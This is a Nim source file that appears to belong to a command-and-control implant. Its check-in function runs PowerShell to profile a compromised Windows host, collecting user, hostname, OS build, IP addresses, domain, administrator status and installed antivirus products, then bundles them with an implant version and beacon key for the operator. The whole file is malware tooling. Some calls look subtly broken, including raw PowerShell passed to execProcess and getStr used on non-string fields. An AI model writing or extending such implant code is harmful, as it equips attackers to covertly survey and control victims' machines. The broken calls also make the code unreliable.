import syscalls
import json
import times
import config
import strutils

proc checkin_command*(id :string): JsonNode =
    let info_command = """$info = @{
    user = $env:USERNAME
    hostname = $env:COMPUTERNAME
    os = (Get-CimInstance Win32_OperatingSystem).Caption
    os_version = (Get-ComputerInfo).WindowsVersion
    os_build = (Get-ComputerInfo).OsBuildNumber
    architecture = $env:PROCESSOR_ARCHITECTURE
    process_id = $PID
    process_name = (Get-Process -Id $PID).ProcessName
    internal_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where {$_.InterfaceAlias -notlike '*Loopback*'} | Select -First 1).IPAddress
    external_ip = (irm https://api.ipify.org)
    domain = (Get-WmiObject Win32_ComputerSystem).Domain
    is_admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')
    av_products = (Get-CimInstance -Namespace root/SecurityCenter2 -Class AntivirusProduct).displayName
    }
    $info | ConvertTo-Json"""
    let checkin_raw = execProcess(info_command).strip()

    echo "[+] Inside the checkin_command function and passed the execProcess func call",checkin_raw

    let checkin_json = parseJson(checkin_raw)

    let checkin_payload = %*{
      "id": id, #agent's id
      "user": checkin_json["user"].getStr(),
      "hostname": checkin_json["hostname"].getStr(), #name of the host in whcih the agent is residing
      "os": checkin_json["os"].getStr(),
      "os_version": checkin_json["os_version"].getStr(),
      "os_build": checkin_json["os_build"].getStr(),
      "architecture": checkin_json["architecture"].getStr(),
      "process_id": checkin_json["process_id"].getStr(),
      "process_name": checkin_json["process_name"].getStr(),
      "internal_ip": checkin_json["internal_ip"].getStr(),
      "external_ip": checkin_json["external_ip"].getStr(),
      "domain": checkin_json["domain"].getStr(),
      "is_admin": checkin_json["is_admin"].getStr(),
      "av_products": checkin_json["av_products"].getStr(),
      "beacon_start_time":  utc(now()).format("yyyy-MM-dd'T'HH:mm:ss'Z'"),
      "first_checkin": utc(now()).format("yyyy-MM-dd'T'HH:mm:ss'Z'"),
      "implant_version": IMPLANT_VERSION,
      "beacon_key": PER_BEACON_KEY,
      "timestamp": utc(now()).format("yyyy-MM-dd'T'HH:mm:ss'Z'"), #like last seen or last activity
      "status": "active",
    }

    return checkin_payload

